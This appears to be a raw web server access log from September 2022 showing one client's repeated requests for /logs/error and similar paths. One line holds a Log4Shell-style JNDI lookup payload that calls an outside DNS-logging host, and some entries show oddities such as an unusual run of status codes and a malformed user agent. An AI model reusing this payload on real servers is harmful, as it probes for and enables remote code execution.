14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error.tar HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.167 - [2022-09-24T17:07:45+08:00] 400 "GET /%22/ HTTP/1.1" ${jndi:dns://khimu1jz62o3qb0g.q39fvow0.ser.dnslog.bid} 0.030 - 559 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error.tar HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error.js HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error.js HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 405 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 406 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 407 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 408 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 409 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 404 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 410 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 410 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 410 "GET /logs/error HTTP/1.1" 120.234.55.179 0.001, - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 410 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"
14.18.16.158 - [2022-09-24T17:26:10+08:00] 411 "GET /logs/error HTTP/1.1" 120.234.55.179 0.000 - 555 - - - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2357.134 Safari/57.36" "-"